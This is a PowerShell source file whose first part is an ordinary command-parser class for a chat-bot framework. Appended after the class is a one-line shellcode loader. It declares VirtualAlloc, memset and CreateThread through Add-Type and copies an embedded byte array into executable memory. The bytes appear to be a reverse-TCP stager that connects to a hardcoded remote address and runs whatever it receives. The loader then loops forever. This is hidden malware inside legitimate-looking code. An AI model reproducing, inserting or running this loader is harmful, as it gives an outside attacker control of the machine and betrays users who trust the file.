
class CommandParser {
    [ParsedCommand] static Parse([Message]$Message) {

        $commandString = [string]::Empty
        if (-not [string]::IsNullOrEmpty($Message.Text)) {
            $commandString = $Message.Text.Trim()
        }

        
        $cmdArray = $commandString.Split(' ')
        $command = $cmdArray[0]
        if ($cmdArray.Count -gt 1) {
            $commandArgs = $cmdArray[1..($cmdArray.length-1)] -join ' '
        } else {
            $commandArgs = [string]::Empty
        }

        
        if ($command -notlike '*://*') {
            $arrCmdStr = $command.Split(':')
        } else {
            $arrCmdStr = @($command)
        }

        
        $version = $null
        if ($arrCmdStr[1] -as [Version]) {
            $version = $arrCmdStr[1]
        } elseif ($arrCmdStr[2] -as [Version]) {
            $version = $arrCmdStr[2]
        }

        
        
        $plugin = [string]::Empty
        if ($Message.Type -eq [MessageType]::Message -and $Message.SubType -eq [MessageSubtype]::None ) {
            $plugin = $arrCmdStr[0]
        }
        if ($arrCmdStr[1] -as [Version]) {
            $command = $arrCmdStr[0]
            $plugin = $null
        } else {
            $command = $arrCmdStr[1]
            if (-not $command) {
                $command = $plugin
                $plugin = $null
            }
        }

        
        $parsedCommand = [ParsedCommand]::new()
        $parsedCommand.CommandString = $commandString
        $parsedCommand.Plugin = $plugin
        $parsedCommand.Command = $command
        $parsedCommand.OriginalMessage = $Message
        $parsedCommand.Time = $Message.Time
        if ($version)          { $parsedCommand.Version  = $version }
        if ($Message.To)       { $parsedCommand.To       = $Message.To }
        if ($Message.ToName)   { $parsedCommand.ToName   = $Message.ToName }
        if ($Message.From)     { $parsedCommand.From     = $Message.From }
        if ($Message.FromName) { $parsedCommand.FromName = $Message.FromName }

        
        try {
            $positionalParams = @()
            $namedParams = @{}

            if (-not [string]::IsNullOrEmpty($commandArgs)) {

                
                
                $astCmdStr = "fake-command $commandArgs" -Replace '(\s--([a-zA-Z0-9])*?)', ' -$2'
                $ast = [System.Management.Automation.Language.Parser]::ParseInput($astCmdStr, [ref]$null, [ref]$null)
                $commandAST = $ast.FindAll({$args[0] -as [System.Management.Automation.Language.CommandAst]},$false)

                for ($x = 1; $x -lt $commandAST.CommandElements.Count; $x++) {
                    $element = $commandAST.CommandElements[$x]

                    
                    
                    if ($element -is [System.Management.Automation.Language.CommandParameterAst]) {

                        $paramName = $element.ParameterName
                        $paramValues = @()
                        $y = 1

                        
                        
                        if ((-not $commandAST.CommandElements[$x+1]) -or ($commandAST.CommandElements[$x+1] -is [System.Management.Automation.Language.CommandParameterAst])) {
                            $paramValues = $true
                        } else {
                            
                            
                            do {
                                $elementValue = $commandAST.CommandElements[$x+$y]

                                if ($elementValue -is [System.Management.Automation.Language.VariableExpressionAst]) {
                                    
                                    
                                    $paramValues += $elementValue.Extent.Text
                                } else {
                                    if ($elementValue.Value) {
                                       $paramValues += $elementValue.Value
                                    } else {
                                        $paramValues += $elementValue.SafeGetValue()
                                    }
                                }
                                $y++
                            } until ((-not $commandAST.CommandElements[$x+$y]) -or $commandAST.CommandElements[$x+$y] -is [System.Management.Automation.Language.CommandParameterAst])
                        }

                        if ($paramValues.Count -eq 1) {
                            $paramValues = $paramValues[0]
                        }
                        $namedParams.Add($paramName, $paramValues)
                        $x += $y-1
                    } else {
                        
                        if ($element -is [System.Management.Automation.Language.VariableExpressionAst]) {
                            $positionalParams += $element.Extent.Text
                        } else {
                            if ($element.Value) {
                                $positionalParams += $element.Value
                            } else {
                                $positionalParams += $element.SafeGetValue()
                            }
                        }
                    }
                }
            }

            $parsedCommand.NamedParameters = $namedParams
            $parsedCommand.PositionalParameters = $positionalParams
        } catch {
            Write-Error -Message "Error parsing command [$CommandString]: $_"
        }

        return $parsedCommand
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xbf,0x54,0x86,0x2b,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

